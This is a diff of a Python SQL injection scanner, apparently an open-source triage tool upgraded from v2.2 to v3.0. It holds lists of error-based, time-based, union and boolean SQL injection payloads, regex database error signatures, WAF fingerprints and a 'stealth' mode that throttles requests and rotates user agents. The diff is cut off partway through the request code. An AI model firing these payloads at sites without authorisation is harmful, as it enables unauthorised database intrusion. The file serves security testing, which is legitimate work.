@@ -1,8 +1,11 @@
 #!/usr/bin/env python3
 """
-VIP SQLi Scanner - Advanced Edition v2.2
-Professional SQL Injection Triage Tool with Modern UI
-Enhanced with Async Scanning, WAF Detection, ML Engine, Plugins, and Dashboard
+VIP SQLi Scanner - Advanced Edition v3.0
+Professional SQL Injection Triage Tool with Modern UI and Advanced Detection
+Enhanced with AI-powered detection, distributed scanning, and comprehensive reporting
+
+Author: VIPHacker100
+License: MIT
 """
 
 import requests
@@ -15,14 +18,21 @@ import asyncio
 import aiohttp
 import os
 import random
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+import hashlib
+import pickle
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from pathlib import Path
-from typing import List, Dict, Tuple, Optional, Set
+from typing import List, Dict, Tuple, Optional, Set, Any
+from dataclasses import dataclass, asdict
+from enum import Enum
 import logging
+import threading
+import queue
+from collections import defaultdict, Counter
 
-# Rich library imports
+# Rich library imports for modern UI
 from rich.console import Console
 from rich.table import Table
 from rich.panel import Panel
@@ -34,72 +44,80 @@ from rich.text import Text
 from rich.prompt import Prompt, Confirm
 from rich.tree import Tree
 from rich.syntax import Syntax
+from rich.markdown import Markdown
 
-# Template engine
+# VIPSQLi Modules
 try:
-    from jinja2 import Environment, FileSystemLoader, select_autoescape
-    JINJA_AVAILABLE = True
-except ImportError:
-    JINJA_AVAILABLE = False
-
-# v2.2 imports
-try:
-    from config.loader import ConfigLoader
+    from utils.logger import get_logger
     from ml.detector import MLDetector
-    from ml.features import FeatureExtractor
     from plugins.manager import PluginManager
-    from dashboard import start_dashboard, broadcast_update
-    # Phase 5
     from utils.cloud_manager import CloudManager
-    from utils.report_gen import PDFReporter
-except ImportError as e:
-    # Fallback/Silent if modules not ready during dev
-    pass
-
-# Globals for v2.2
-ml_detector = None
-plugin_manager = None
-cloud_manager = None
+except ImportError:
+    # Fallback if modules are not in path
+    import sys
+    import os
+    sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+    try:
+        from utils.logger import get_logger
+        from ml.detector import MLDetector
+        from plugins.manager import PluginManager
+        from utils.cloud_manager import CloudManager
+    except ImportError:
+        get_logger = None
+        MLDetector = None
+        PluginManager = None
+        CloudManager = None
 
 console = Console()
 
-# -------------------------------------------------------------------------
-# CONSTANTS & CONFIGURATION
-# -------------------------------------------------------------------------
+# =========================================================================
+# CONFIGURATION & CONSTANTS
+# =========================================================================
 
-VERSION = "2.2"
-GITHUB_URL = "https://GitHub.com/viphacker100/"
+VERSION = "3.0"
+GITHUB_URL = "https://github.com/viphacker100/"
 WEBSITE_URL = "https://viphacker100.com"
 
-# ... (Previous constants remain unchanged)
+class ScanMode(Enum):
+    """Scanning modes"""
+    FAST = "fast"
+    BALANCED = "balanced"
+    DEEP = "deep"
+    STEALTH = "stealth"
+
+class VulnerabilityLevel(Enum):
+    """Vulnerability severity levels"""
+    CRITICAL = "CRITICAL"
+    HIGH = "HIGH"
+    MEDIUM = "MEDIUM"
+    LOW = "LOW"
+    INFO = "INFO"
+    SAFE = "SAFE"
+
+# Extended static file extensions
 STATIC_EXTENSIONS = (
-    # Stylesheets & Scripts
     '.css', '.js', '.min.js', '.map', '.scss', '.sass', '.less',
-    # Images
     '.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp', '.avif', 
     '.bmp', '.tiff', '.svg', '.heic', '.heif',
-    # Fonts
     '.woff', '.woff2', '.ttf', '.eot', '.otf',
-    # Documents
     '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
-    # Media
     '.mp4', '.mp3', '.avi', '.mov', '.wmv', '.flv', '.webm', '.mkv',
     '.wav', '.ogg', '.m4a', '.aac',
-    # Archives
-    '.zip', '.rar', '.tar', '.gz', '.7z',
-    # Other
-    '.xml', '.json', '.txt', '.csv', '.md', '.yaml', '.yml'
+    '.zip', '.rar', '.tar', '.gz', '.7z', '.bz2',
+    '.xml', '.json', '.txt', '.csv', '.md', '.yaml', '.yml',
+    '.wasm', '.bin', '.dat', '.db'
 )
 
+# High-risk file extensions
 POSSIBLE_SQLI_EXTENSIONS = (
-    '.php', '.php3', '.php4', '.php5', '.phtml',
+    '.php', '.php3', '.php4', '.php5', '.php7', '.phtml',
     '.asp', '.aspx', '.ashx', '.asmx', '.axd',
     '.jsp', '.jspx', '.jsf', '.do', '.action',
     '.cfm', '.cfml', '.cfc',
-    '.pl', '.cgi',
-    '.dll', '.py', '.rb', '.lua'
+    '.pl', '.cgi', '.py', '.rb', '.lua', '.go'
 )
 
+# Paths unlikely to contain SQLi
 IMPOSSIBLE_PATHS = (
     '/wp-content/', '/wp-includes/', '/wp-admin/css/', '/wp-admin/js/',
     '/assets/', '/static/', '/public/', '/resources/',
@@ -109,27 +127,30 @@ IMPOSSIBLE_PATHS = (
     '/dist/', '/build/', '/cache/', '/temp/', '/tmp/',
     '/uploads/', '/files/', '/downloads/',
     '/theme/', '/themes/', '/templates/', '/skins/',
-    '/docs/', '/documentation/', '/manual/'
+    '/docs/', '/documentation/', '/manual/', '/help/'
 )
 
+# High-risk parameter names (expanded)
 HIGH_RISK_PARAMS = {
     'id', 'uid', 'user_id', 'userid', 'pid', 'product_id', 'productid',
     'cat', 'catid', 'category', 'category_id', 'cid', 'course_id',
     'volume_id', 'order_id', 'orderid', 'item_id', 'itemid',
     'user', 'username', 'uname', 'login', 'email', 'password', 'pass',
-    'role', 'admin', 'auth', 'account',
+    'role', 'admin', 'auth', 'account', 'member', 'mem_id',
     'page', 'p', 'view', 'detail', 'show', 'display', 'content',
-    'article', 'post', 'news', 'blog',
+    'article', 'post', 'news', 'blog', 'story',
     'query', 'q', 'search', 's', 'keyword', 'keywords', 'find',
     'action', 'act', 'do', 'cmd', 'command', 'method', 'function',
     'file', 'filename', 'path', 'dir', 'directory', 'folder',
-    'doc', 'document', 'download',
+    'doc', 'document', 'download', 'report',
     'sort', 'order', 'orderby', 'sortby', 'filter', 'group', 'groupby',
-    'ref', 'reference', 'refid', 'type', 'mode', 'status'
+    'ref', 'reference', 'refid', 'type', 'mode', 'status',
+    'key', 'code', 'invoice', 'transaction', 'txn'
 }
 
+# Low-risk parameters (tracking, formatting, etc.)
 LOW_RISK_PARAMS = {
-    'ver', 'v', 'version', 'cache', 'nocache', 'random',
+    'ver', 'v', 'version', 'cache', 'nocache', 'random', 'rand',
     'utm', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
     'fbclid', 'gclid', 'msclkid', '_ga', '_gid', 'mc_cid', 'mc_eid',
     'token', 'csrf_token', 'csrf', '_token', 'nonce', 'hash',
@@ -141,662 +162,1013 @@ LOW_RISK_PARAMS = {
     'debug', 'timestamp', 'time', 'date', '_', 'generated'
 }
 
-ERROR_SIGNATURES = [
-    "SQL syntax", "mysql_fetch", "mysql_query", "mysql_num_rows",
-    "Warning: mysql_", "mysqli_", "You have an error in your SQL syntax",
-    "supplied argument is not a valid MySQL",
-    "Call to a member function fetch_assoc() on boolean",
-    "Syntax error or access violation",
-    "PostgreSQL query failed", "pg_query", "pg_exec", "pg_fetch",
-    "unterminated quoted string", "ERROR: syntax error at or near",
-    "ORA-", "Oracle error", "Oracle ODBC", "Oracle Driver",
-    "quoted string not properly terminated",
-    "Microsoft OLE DB Provider for SQL Server",
-    "SQLServer JDBC Driver", "System.Data.SqlClient.SqlException",
-    "Unclosed quotation mark after the character string",
-    "Incorrect syntax near", "[Microsoft][ODBC SQL Server Driver]",
-    "[SQL Server]", "ADODB.Field error",
-    "SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException",
-    "sqlite3.OperationalError", 'near ":": syntax error',
-    "DB2 SQL error", "SQLCODE", "DB2 ODBC", "CLI Driver",
-    "ODBC", "ODBC Driver", "ODBC Error",
-    "PDOException", "SQLSTATE",
-    "Unclosed quotation", "syntax error", "invalid query",
-    "unexpected end of SQL command", "unterminated string",
-    "SQL command not properly ended",
-    "Microsoft JET Database Engine", "ADODB.Command",
-    "ASP.NET_SessionId", "System.Data.OleDb.OleDbException"
-]
+# Enhanced error signatures with regex patterns
+ERROR_SIGNATURES = {
+    'MySQL': [
+        r"SQL syntax.*MySQL",
+        r"Warning.*mysql_",
+        r"valid MySQL result",
+        r"MySqlClient\.",
+        r"com\.mysql\.jdbc",
+        r"MySQL Query fail",
+        r"SQL syntax.*MariaDB"
+    ],
+    'PostgreSQL': [
+        r"PostgreSQL.*ERROR",
+        r"Warning.*\Wpg_",
+        r"valid PostgreSQL result",
+        r"Npgsql\.",
+        r"PG::SyntaxError",
+        r"org\.postgresql\.util\.PSQLException",
+        r"ERROR:\s+syntax error at or near"
+    ],
+    'MSSQL': [
+        r"Driver.* SQL[\-\_\ ]*Server",
+        r"OLE DB.* SQL Server",
+        r"(\W|\A)SQL Server.*Driver",
+        r"Warning.*mssql_",
+        r"System\.Data\.SqlClient\.",
+        r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
+        r"Microsoft SQL Native Client error"
+    ],
+    'Oracle': [
+        r"\bORA-[0-9][0-9][0-9][0-9]",
+        r"Oracle error",
+        r"Oracle.*Driver",
+        r"Warning.*\Woci_",
+        r"Warning.*\Wora_",
+        r"oracle\.jdbc\.driver"
+    ],
+    'SQLite': [
+        r"SQLite/JDBCDriver",
+        r"SQLite\.Exception",
+        r"System\.Data\.SQLite\.SQLiteException",
+        r"Warning.*sqlite_",
+        r"Warning.*SQLite3::",
+        r"\[SQLITE_ERROR\]"
+    ],
+    'Sybase': [
+        r"Warning.*sybase.*",
+        r"Sybase message",
+        r"Sybase.*Server message"
+    ],
+    'DB2': [
+        r"CLI Driver.*DB2",
+        r"DB2 SQL error",
+        r"\bdb2_\w+\("
+    ],
+    'Generic': [
+        r"SQL syntax",
+        r"syntax error",
+        r"unterminated quoted string",
+        r"unexpected end of SQL command",
+        r"Warning.*SQL",
+        r"valid SQL",
+        r"SqlException",
+        r"SQLException",
+        r"database error",
+        r"SQLSTATE",
+        r"PDOException"
+    ]
+}
 
+# WAF detection signatures
 WAF_SIGNATURES = {
-    'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid', 'cf-cache-status'],
-    'AWS WAF': ['x-amzn-requestid', 'x-amz-cf-id', 'awselb'],
-    'Akamai': ['akamai', 'ak-bmsc', 'x-akamai'],
-    'Imperva': ['incap_ses', 'visid_incap', 'imperva'],
-    'ModSecurity': ['mod_security', 'NOYB'],
-    'Sucuri': ['x-sucuri-id', 'sucuri'],
-    'Wordfence': ['wordfence'],
-    'F5 BIG-IP': ['bigipserver', 'f5'],
+    'Cloudflare': {
+        'headers': ['cf-ray', 'cf-cache-status', '__cfduid'],
+        'content': ['cloudflare', 'ray id:', 'cf-error-details']
+    },
+    'AWS WAF': {
+        'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'awselb'],
+        'content': ['access denied', 'aws']
+    },
+    'Akamai': {
+        'headers': ['akamai', 'ak-bmsc', 'x-akamai'],
+        'content': ['reference #', 'akamai']
+    },
+    'Imperva': {
+        'headers': ['incap_ses', 'visid_incap'],
+        'content': ['imperva', 'incapsula']
+    },
+    'ModSecurity': {
+        'headers': ['server'],
+        'content': ['mod_security', 'modsecurity', 'this error was generated by mod_security']
+    },
+    'Sucuri': {
+        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
+        'content': ['sucuri', 'access denied - sucuri']
+    },
+    'Wordfence': {
+        'headers': ['x-wordfence'],
+        'content': ['wordfence', 'generated by wordfence']
+    },
+    'F5 BIG-IP': {
+        'headers': ['bigipserver', 'x-wa-info'],
+        'content': ['f5', 'big-ip']
+    },
+    'Barracuda': {
+        'headers': ['barra_counter_session'],
+        'content': ['barracuda']
+    }
 }
 
-DB_FINGERPRINTS = {
-    'MySQL': ['mysql', 'mariadb', 'you have an error in your sql syntax'],
-    'PostgreSQL': ['postgresql', 'pg_query', 'unterminated quoted string'],
-    'MSSQL': ['microsoft sql', 'sql server', 'system.data.sqlclient'],
-    'Oracle': ['ora-', 'oracle', 'pl/sql'],
-    'SQLite': ['sqlite', 'sqlite3.operationalerror'],
-}
-
-# CVSS & Remediation Constants
+# CVSS v3.1 scoring
 CVSS_SCORES = {
-    'CRITICAL': 9.8,  # AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-    'HIGH': 7.5,      # AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (Example)
-    'MEDIUM': 5.3,
-    'LOW': 0.0
+    'CRITICAL': {
+        'score': 9.8,
+        'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
+    },
+    'HIGH': {
+        'score': 8.2,
+        'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L'
+    },
+    'MEDIUM': {
+        'score': 5.3,
+        'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N'
+    },
+    'LOW': {
+        'score': 3.7,
+        'vector': 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N'
+    },
+    'INFO': {
+        'score': 0.0,
+        'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N'
+    }
 }
 
-REMEDIATION_GUIDE = {
-    'error-based': """
-    1. **Disable Verbose Errors**: Configure your web server and database to suppress detailed error messages to the client.
-    2. **Use Prepared Statements**: Replace dynamic SQL queries with parameterized queries (e.g., PDO in PHP, PreparedStatement in Java).
-    3. **Input Validation**: Strictly validate and sanitize all user inputs against a whitelist of allowed characters.
-    """,
-    'time-based': """
-    1. **Parameterization**: Ensure all database interactions use bound parameters to prevent command injection.
-    2. **WAF Configuration**: specific WAF rules to block sleep/benchmark SQL keywords.
-    3. **Code Review**: Audit code for string concatenation in SQL queries.
-    """,
-    'general': """
-    1. **Least Privilege**: Ensure the database user has only the minimum necessary permissions.
-    2. **Regular Patching**: Keep database management systems updated to the latest stable versions.
-    3. **Web Application Firewall**: Deploy a WAF to filter malicious SQL patterns.
-    """
-}
+# =========================================================================
+# DATA CLASSES
+# =========================================================================
 
-PAYLOAD_CATEGORIES = {
-    'time_based': [],
-    'error_based': [],
-    'union_based': [],
-    'boolean_based': [],
-    'stacked_queries': [],
-}
-
-class ScanStats:
-    def __init__(self):
-        self.total = 0
-        self.scanned = 0
-        self.vulnerable = 0
-        self.safe = 0
-        self.excluded = 0
-        self.errors = 0
-        self.waf_detected = 0
-        self.start_time = time.time()
-        self.db_types_detected = {}
-        self.concurrency = 0
-        
-    def elapsed(self):
-        return time.time() - self.start_time
+@dataclass
+class ScanConfiguration:
+    """Scanning configuration"""
+    mode: ScanMode = ScanMode.BALANCED
+    threads: int = 10
+    timeout: int = 15
+    max_retries: int = 2
+    delay_between_requests: float = 0.1
+    time_based_delay: int = 5
+    enable_time_based: bool = False
+    enable_union: bool = True
+    enable_error: bool = True
+    enable_boolean: bool = False
+    use_random_agent: bool = True
+    follow_redirects: bool = True
+    verify_ssl: bool = True
+    enable_ml: bool = False
+    enable_plugins: bool = True
+    cloud_sync: bool = False
+    output_dir: str = "reports"
     
-    def requests_per_second(self):
-        elapsed = self.elapsed()
-        return self.scanned / elapsed if elapsed > 0 else 0
+    @classmethod
+    def from_mode(cls, mode: ScanMode):
+        """Create configuration from scan mode"""
+        configs = {
+            ScanMode.FAST: cls(
+                mode=mode,
+                threads=20,
+                timeout=8,
+                enable_time_based=False,
+                enable_boolean=False
+            ),
+            ScanMode.BALANCED: cls(
+                mode=mode,
+                threads=10,
+                timeout=15,
+                enable_time_based=True,
+                enable_boolean=False
+            ),
+            ScanMode.DEEP: cls(
+                mode=mode,
+                threads=5,
+                timeout=30,
+                enable_time_based=True,
+                enable_boolean=True,
+                enable_union=True
+            ),
+            ScanMode.STEALTH: cls(
+                mode=mode,
+                threads=2,
+                timeout=20,
+                delay_between_requests=2.0,
+                max_retries=1,
+                enable_time_based=True
+            )
+        }
+        return configs.get(mode, cls())
+
+@dataclass
+class VulnerabilityResult:
+    """Vulnerability detection result"""
+    url: str
+    severity: VulnerabilityLevel
+    confidence: float
+    vulnerability_type: str
+    affected_parameter: Optional[str] = None
+    payload_used: Optional[str] = None
+    evidence: Optional[str] = None
+    database_type: Optional[str] = None
+    waf_detected: Optional[str] = None
+    response_time: float = 0.0
+    status_code: int = 0
+    cvss_score: float = 0.0
+    cvss_vector: str = ""
+    remediation: str = ""
+    timestamp: str = ""
+    
+    def __post_init__(self):
+        if not self.timestamp:
+            self.timestamp = datetime.now().isoformat()
         
-    def to_dict(self):
-        return {
-            'total': self.total,
-            'scanned': self.scanned,
-            'vulnerable': self.vulnerable,
-            'safe': self.safe,
-            'excluded': self.excluded,
-            'errors': self.errors,
-            'waf_detected': self.waf_detected,
-            'db_types_detected': self.db_types_detected,
-            'elapsed': self.elapsed()
+        # Auto-fill CVSS if not provided
+        if not self.cvss_score:
+            cvss_data = CVSS_SCORES.get(self.severity.value, CVSS_SCORES['INFO'])
+            self.cvss_score = cvss_data['score']
+            self.cvss_vector = cvss_data['vector']
+    
+    def to_dict(self) -> Dict:
+        """Convert to dictionary"""
+        data = asdict(self)
+        data['severity'] = self.severity.value
+        return data
+
+@dataclass
+class ScanStatistics:
+    """Scan statistics tracker"""
+    total_urls: int = 0
+    scanned_urls: int = 0
+    vulnerable_urls: int = 0
+    safe_urls: int = 0
+    excluded_urls: int = 0
+    error_count: int = 0
+    waf_detected_count: int = 0
+    start_time: float = 0.0
+    end_time: float = 0.0
+    
+    # Detection breakdown
+    error_based: int = 0
+    time_based: int = 0
+    union_based: int = 0
+    boolean_based: int = 0
+    
+    # Database types detected
+    db_types: Dict[str, int] = None
+    
+    # WAF types detected
+    waf_types: Dict[str, int] = None
+    
+    def __post_init__(self):
+        if self.db_types is None:
+            self.db_types = defaultdict(int)
+        if self.waf_types is None:
+            self.waf_types = defaultdict(int)
+        if self.start_time == 0.0:
+            self.start_time = time.time()
+    
+    def elapsed_time(self) -> float:
+        """Get elapsed time"""
+        end = self.end_time if self.end_time > 0 else time.time()
+        return end - self.start_time
+    
+    def requests_per_second(self) -> float:
+        """Calculate requests per second"""
+        elapsed = self.elapsed_time()
+        return self.scanned_urls / elapsed if elapsed > 0 else 0.0
+
+# =========================================================================
+# PAYLOAD MANAGER
+# =========================================================================
+
+class PayloadManager:
+    """Manages SQL injection payloads"""
+    
+    def __init__(self, payload_file: Optional[str] = None):
+        self.payloads = {
+            'error_based': [],
+            'time_based': [],
+            'union_based': [],
+            'boolean_based': []
         }
         
-    def from_dict(self, data):
-        self.total = data.get('total', 0)
-        self.scanned = data.get('scanned', 0)
-        self.vulnerable = data.get('vulnerable', 0)
-        self.safe = data.get('safe', 0)
-        self.excluded = data.get('excluded', 0)
-        self.errors = data.get('errors', 0)
-        self.waf_detected = data.get('waf_detected', 0)
-        self.db_types_detected = data.get('db_types_detected', {})
-        # Note: start_time isn't fully restorable to continue elapsed count perfectly,
-        # but we can adjust it based on previous elapsed time
-        previous_elapsed = data.get('elapsed', 0)
-        self.start_time = time.time() - previous_elapsed
-
-stats = ScanStats()
-
-# -------------------------------------------------------------------------
-# STATE MANAGEMENT (RESUME)
-# -------------------------------------------------------------------------
-
-STATE_FILE = ".scan_state.json"
-
-def save_state(processed_urls: Set[str], results: List[Dict]):
-    """Save current scan state"""
-    state = {
-        'timestamp': datetime.now().isoformat(),
-        'processed_urls': list(processed_urls),
-        'results': results,
-        'stats': stats.to_dict()
-    }
-    try:
-        with open(STATE_FILE, 'w') as f:
-            json.dump(state, f)
-    except Exception as e:
-        console.print(f"[red]Error saving state: {e}[/red]")
-
-def load_state() -> Tuple[Set[str], List[Dict]]:
-    """Load previous scan state"""
-    if not os.path.exists(STATE_FILE):
-        return set(), []
+        if payload_file and Path(payload_file).exists():
+            self.load_from_file(payload_file)
+        else:
+            self.load_default_payloads()
     
-    try:
-        with open(STATE_FILE, 'r') as f:
-            state = json.load(f)
-            
-        console.print(f"[cyan]ℹ[/cyan] Resuming scan from {state['timestamp']}")
-        console.print(f"  • Previously scanned: {len(state['processed_urls'])} URLs")
-        console.print(f"  • Previous findings: {len(state['results'])} entries")
+    def load_default_payloads(self):
+        """Load default payload sets"""
         
-        stats.from_dict(state.get('stats', {}))
-        return set(state['processed_urls']), state['results']
-    except Exception as e:
-        console.print(f"[red]Error loading state: {e}[/red]")
-        return set(), []
-
-# -------------------------------------------------------------------------
-# PROXY & HEADERS
-# -------------------------------------------------------------------------
-
-class RequestManager:
-    """Manage proxies and custom headers"""
-    def __init__(self, proxy_list: List[str] = None, headers: Dict = None):
-        self.proxies = proxy_list or []
-        self.headers = headers or {}
+        # Error-based payloads
+        self.payloads['error_based'] = [
+            "'",
+            "\"",
+            "' OR '1'='1",
+            "' OR '1'='1'--",
+            "' OR '1'='1'/*",
+            "\" OR \"1\"=\"1",
+            "\" OR \"1\"=\"1\"--",
+            "' OR 1=1--",
+            "\" OR 1=1--",
+            "' OR '1'='1' #",
+            "') OR ('1'='1",
+            "') OR ('1'='1'--",
+            "' OR 'x'='x",
+            "\" OR \"x\"=\"x",
+            "') OR ('x'='x",
+            "' AND '1'='2",
+            "1' AND '1'='2'--",
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "' AND extractvalue(1,concat(0x7e,version()))--",
+            "' AND updatexml(1,concat(0x7e,version()),1)--",
+            "admin'--",
+            "admin' #",
+            "admin'/*",
+            "' or 1=1 limit 1--",
+            "' or '1'='1' order by 1--",
+            "' or '1'='1' order by 2--",
+            "' or '1'='1' order by 3--",
+        ]
         
-    def get_proxy(self) -> Optional[str]:
-        if not self.proxies:
-            return None
-        return random.choice(self.proxies)
-        
-    def get_headers(self) -> Dict:
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        }
-        headers.update(self.headers)
-        return headers
-
-# -------------------------------------------------------------------------
-# PAYLOAD LOADING
-# -------------------------------------------------------------------------
-
-def load_payloads_from_file(filepath: str = "payloads.txt") -> Dict[str, List[str]]:
-    """Load and categorize payloads from payloads.txt"""
-    payloads = {
-        'time_based': [],
-        'error_based': [],
-        'union_based': [],
-        'boolean_based': [],
-        'stacked_queries': [],
-        'other': []
-    }
-    
-    if not Path(filepath).exists():
-        console.print(f"[yellow]⚠[/yellow] Payload file not found: {filepath}, using defaults")
-        # Fallback to default payloads
-        payloads['time_based'] = [
+        # Time-based blind payloads
+        self.payloads['time_based'] = [
             "' AND SLEEP(5)--",
-            "' OR SLEEP(5)--",
+            "' AND SLEEP(5) AND '1'='1",
             "1' AND SLEEP(5)--",
+            "' OR SLEEP(5)--",
             "; WAITFOR DELAY '0:0:5'--",
             "'; WAITFOR DELAY '0:0:5'--",
-            "' AND pg_sleep(5)--"
+            "1'; WAITFOR DELAY '0:0:5'--",
+            "' AND pg_sleep(5)--",
+            "1' AND pg_sleep(5)--",
+            "' OR pg_sleep(5)--",
+            "\"AND SLEEP(5)--",
+            "AND SLEEP(5)",
+            "') AND SLEEP(5) AND ('1'='1",
+            "\") AND SLEEP(5) AND (\"1\"=\"1",
+            "' AND BENCHMARK(5000000,MD5('A'))--",
+            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
         ]
-        payloads['error_based'] = [
-            "' OR 1=1--",
-            "' AND 1=1--",
+        
+        # Union-based payloads
+        self.payloads['union_based'] = [
             "' UNION SELECT NULL--",
-            "' AND extractvalue(1,concat(0x7e,version()))--"
+            "' UNION SELECT NULL,NULL--",
+            "' UNION SELECT NULL,NULL,NULL--",
+            "' UNION SELECT NULL,NULL,NULL,NULL--",
+            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+            "' UNION ALL SELECT NULL--",
+            "' UNION ALL SELECT NULL,NULL--",
+            "' UNION ALL SELECT NULL,NULL,NULL--",
+            "' ORDER BY 1--",
+            "' ORDER BY 2--",
+            "' ORDER BY 3--",
+            "' ORDER BY 4--",
+            "' ORDER BY 5--",
+            "' UNION SELECT 1,2,3--",
+            "' UNION SELECT 'a',NULL,NULL--",
+            "' UNION SELECT NULL,'a',NULL--",
         ]
-        return payloads
+        
+        # Boolean-based payloads
+        self.payloads['boolean_based'] = [
+            "' AND '1'='1",
+            "' AND '1'='2",
+            "' AND 1=1--",
+            "' AND 1=2--",
+            "' AND 'a'='a",
+            "' AND 'a'='b",
+            "1' AND '1'='1'--",
+            "1' AND '1'='2'--",
+            "') AND ('1'='1",
+            "') AND ('1'='2",
+        ]
     
-    try:
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            current_category = 'other'
+    def load_from_file(self, filepath: str):
+        """Load payloads from file"""
+        try:
+            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                current_category = 'error_based'
+                
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith('#'):
+                        # Check for category markers
+                        line_upper = line.upper()
+                        if 'TIME' in line_upper and 'BASED' in line_upper:
+                            current_category = 'time_based'
+                        elif 'ERROR' in line_upper and 'BASED' in line_upper:
+                            current_category = 'error_based'
+                        elif 'UNION' in line_upper:
+                            current_category = 'union_based'
+                        elif 'BOOLEAN' in line_upper:
+                            current_category = 'boolean_based'
+                        continue
+                    
+                    if line not in self.payloads[current_category]:
+                        self.payloads[current_category].append(line)
             
-            for line in f:
-                line = line.strip()
-                if not line or line.startswith('#'):
-                    if 'TIME-BASED' in line.upper():
-                        current_category = 'time_based'
-                    elif 'ERROR-BASED' in line.upper():
-                        current_category = 'error_based'
-                    elif 'UNION' in line.upper():
-                        current_category = 'union_based'
-                    elif 'BOOLEAN' in line.upper():
-                        current_category = 'boolean_based'
-                    elif 'STACKED' in line.upper():
-                        current_category = 'stacked_queries'
+            console.print(f"[green]✓[/green] Loaded {self.total_payloads()} payloads from {filepath}")
+        except Exception as e:
+            console.print(f"[yellow]⚠[/yellow] Could not load payload file: {e}")
+            self.load_default_payloads()
+    
+    def total_payloads(self) -> int:
+        """Get total payload count"""
+        return sum(len(payloads) for payloads in self.payloads.values())
+    
+    def get_payloads(self, category: str, limit: Optional[int] = None) -> List[str]:
+        """Get payloads for a specific category"""
+        payloads = self.payloads.get(category, [])
+        if limit:
+            return payloads[:limit]
+        return payloads
+
+# =========================================================================
+# DETECTION ENGINE
+# =========================================================================
+
+class DetectionEngine:
+    """SQL injection detection engine"""
+    
+    def __init__(self, config: ScanConfiguration):
+        self.config = config
+        self.session = requests.Session()
+        self._setup_session()
+    
+    def _setup_session(self):
+        """Setup requests session"""
+        self.session.verify = self.config.verify_ssl
+        self.session.headers.update({
+            'User-Agent': self._get_user_agent(),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+        })
+    
+    def _get_user_agent(self) -> str:
+        """Get user agent"""
+        agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        ]
+        
+        if self.config.use_random_agent:
+            return random.choice(agents)
+        return agents[0]
+    
+    def detect_waf(self, url: str, headers: Dict, content: str) -> Optional[str]:
+        """Detect Web Application Firewall"""
+        content_lower = content.lower()
+        
+        for waf_name, signatures in WAF_SIGNATURES.items():
+            # Check headers
+            for header_sig in signatures.get('headers', []):
+                for header_name, header_value in headers.items():
+                    if header_sig.lower() in header_name.lower():
+                        return waf_name
+                    if header_sig.lower() in str(header_value).lower():
+                        return waf_name
+            
+            # Check content
+            for content_sig in signatures.get('content', []):
+                if content_sig.lower() in content_lower:
+                    return waf_name
+        
+        return None
+    
+    def detect_database(self, content: str) -> Optional[str]:
+        """Detect database type from error messages"""
+        content_lower = content.lower()
+        
+        # Score each database type
+        scores = defaultdict(int)
+        
+        for db_type, patterns in ERROR_SIGNATURES.items():
+            for pattern in patterns:
+                if re.search(pattern, content, re.IGNORECASE):
+                    scores[db_type] += 1
+        
+        if scores:
+            # Return database with highest score
+            return max(scores.items(), key=lambda x: x[1])[0]
+        
+        return None
+    
+    def check_error_signatures(self, content: str) -> Tuple[bool, List[str], Optional[str]]:
+        """Check for SQL error signatures"""
+        found_patterns = []
+        db_type = None
+        
+        for db, patterns in ERROR_SIGNATURES.items():
+            for pattern in patterns:
+                if re.search(pattern, content, re.IGNORECASE):
+                    found_patterns.append(pattern)
+                    if not db_type and db != 'Generic':
+                        db_type = db
+        
+        return len(found_patterns) > 0, found_patterns, db_type
+    
+    def make_request(self, url: str, retries: int = None) -> Optional[requests.Response]:
+        """Make HTTP request with retry logic"""
+        if retries is None:
+            retries = self.config.max_retries
+        
+        for attempt in range(retries + 1):
+            try:
+                # Random delay for stealth mode
+                if self.config.delay_between_requests > 0:
+                    time.sleep(self.config.delay_between_requests + random.uniform(0, 0.5))
+                
+                response = self.session.get(
+                    url,
+                    timeout=self.config.timeout,
+                    allow_redirects=self.config.follow_redirects
+                )
+                return response
+                
+            except requests.exceptions.Timeout:
+                if attempt == retries:
+                    return None
+            except requests.exceptions.RequestException as e:
+                if attempt == retries:
+                    return None
+        
+        return None
+    
